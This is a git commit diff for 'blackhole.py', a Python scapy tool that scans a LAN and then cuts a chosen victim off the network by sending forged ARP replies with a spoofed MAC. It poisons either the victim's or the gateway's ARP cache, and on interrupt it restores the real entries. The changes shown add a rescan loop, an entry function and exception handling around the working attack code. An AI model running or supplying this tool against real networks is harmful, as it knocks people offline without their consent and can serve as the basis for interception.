3551cf4bf999b6e32ee677c720a8deff30dc7710
root <root@localhost.localdomain>
2018-04-13 18:52:52 -0400

    tl;dr: changed a lot :P

--- blackhole.py
+++ blackhole.py
@@ -6,6 +6,7 @@ import os
 from scapy.all import *
 from time import sleep
 import random
+import traceback
 
 
 def welcome():
@@ -19,23 +20,29 @@ def welcome():
 	print('\n\n')
 
 
-def sniff(ipv4, gateway_ipv4, interface):
+def sniff(ipv4, gateway_ipv4, interface, re_sniff = 0):
 	cprint("Sniffing...", 'blue', attrs = ['bold'])
 	print('\n\n')
 	resp,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipv4),
 			timeout=2, verbose=False, iface=interface)
 	print('IPv4          :          MAC')
 	print('..................................')
-	resp.summary(lambda(s,r): r.sprintf("%ARP.psrc% : %Ether.src%") )
+	# not using this because now displaying MAC vendors too
+	# resp.summary(lambda(s,r): r.sprintf("%ARP.psrc% : %Ether.src%") )
 	ip_mac = {}
 	for x in resp:
 		ip_mac[str(x[1][ARP].psrc)] = str(x[1][Ether].src)
+		print(str(x[1][ARP].psrc) + ' : ' + str(x[1][Ether].src))
 	if '/' not in ipv4:
-		resp_g,unans_g=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ipv4),
-			timeout=2, verbose=False, iface=interface)
-		for x in resp_g:
-			ip_mac[str(x[1][ARP].psrc)] = str(x[1][Ether].src)
-	return ip_mac	
+		if bool(ip_mac):
+			resp_g,unans_g=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ipv4),
+				timeout=2, verbose=False, iface=interface)
+			for x in resp_g:
+				ip_mac[str(x[1][ARP].psrc)] = str(x[1][Ether].src)
+	if re_sniff == 1:
+		blackhole(ip_mac, gateway_ipv4, interface, ipv4)
+	else:
+		return ip_mac	
 
 
 def spoofMac(): 
@@ -43,7 +50,7 @@ def spoofMac():
     return ':'.join(map(lambda x: "%02x" % x, mac))
 
 
-def reverse_blackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac):
+def reverseBlackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac):
 	if opt == 1:
 		packet = ARP(op=2, psrc=gateway_ipv4, hwsrc=gateway_mac, pdst=victim_ipv4, hwdst=victim_mac)
 		for i in range(50):
@@ -57,10 +64,20 @@ def reverse_blackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac):
 	print('\n\n')
 
 
-def blackhole(ip_mac, gateway_ipv4):
+def blackhole(ip_mac, gateway_ipv4, interface, ipv4_or_ipv4cidr):
 	print('\n\n')
 	if not bool(ip_mac):
-			print('No hosts found on LAN')
+			print('No hosts found on LAN.\n')
+			opt = int(str(raw_input('Do you wan\'t to scan again? [Choose 1 to scan again with the same values | Choose 2 to scan with new values] : ')))
+			if opt == 1:
+				print('\n\n')
+				sniff(ipv4_or_ipv4cidr, gateway_ipv4, interface, 1)
+			elif opt == 2:
+				entry()	
+			else:
+				print('\n\n')
+				cprint('Exiting...', 'yellow', attrs = ['bold'])
+				print('\n\n')
 	else:
 		victim_ipv4 = str(raw_input('Enter victim\'s IPv4 : ')).strip()
 		print('\n')		
@@ -83,7 +100,7 @@ def blackhole(ip_mac, gateway_ipv4):
 			except KeyboardInterrupt:
 				print('\n\n')
 				cprint("Stopped Blackholing. Restoring network...", 'blue', attrs = ['bold'])
-				reverse_blackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac)
+				reverseBlackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac)
 		elif opt == 2:
 			packet = ARP(op=2, psrc=victim_ipv4, hwsrc=spoofed_mac, pdst=gateway_ipv4, hwdst=gateway_mac)
 			cprint('Blackholing ' + victim_ipv4 + ' by poisoning Gateway\'s ARP Cache [CTRL-C to stop]', 'blue', attrs = ['bold'])
@@ -93,18 +110,30 @@ def blackhole(ip_mac, gateway_ipv4):
 			except KeyboardInterrupt:
 				print('\n\n')
 				cprint("Stopped Blackholing. Restoring network...", 'blue', attrs = ['bold'])
-				reverse_blackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac)
+				reverseBlackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac)
 		else:
 			cprint("Wrong option. Exiting...", 'blue', attrs = ['bold'])
 
 
+def entry():
+	welcome()
+	ipv4_or_ipv4cidr = str(raw_input('Enter IPv4 or CIDR (192.168.1.23 or 192.168.1.0/24) : ')).strip()
+	print('\n')
+	gateway_ipv4 = str(raw_input('Enter Gateway\'s IPv4 : ')).strip()
+	print('\n')
+	interface = str(raw_input('Enter interface : ')).strip()
+	print('\n')
+	ip_mac = sniff(ipv4_or_ipv4cidr, gateway_ipv4, interface)
+	blackhole(ip_mac, gateway_ipv4, interface, ipv4_or_ipv4cidr)
+
+
 if __name__ == '__main__':
-		welcome()
-		ipv4_or_ipv4cidr = str(raw_input('Enter IPv4 or CIDR (192.168.1.23 or 192.168.1.0/24) : ')).strip()
-		print('\n')
-		gateway_ipv4 = str(raw_input('Enter Gateway\'s IPv4 : ')).strip()
-		print('\n')
-		interface = str(raw_input('Enter interface : ')).strip()
-		print('\n')
-		ip_mac = sniff(ipv4_or_ipv4cidr, gateway_ipv4, interface)
-		blackhole(ip_mac, gateway_ipv4)
+	try:
+		entry()
+	except Exception, e:
+		cprint("Some exception occurred. Please check your input and try again by restarting the tool. Anyways, printing the exception so that you can debug it.", 'red', attrs = ['bold'])
+		print('\n\n')
+		traceback.print_exc(file=sys.stdout)
+		print('\n\n')
+		cprint("Exiting now...", 'yellow', attrs = ['bold'])
+		print('\n\n')
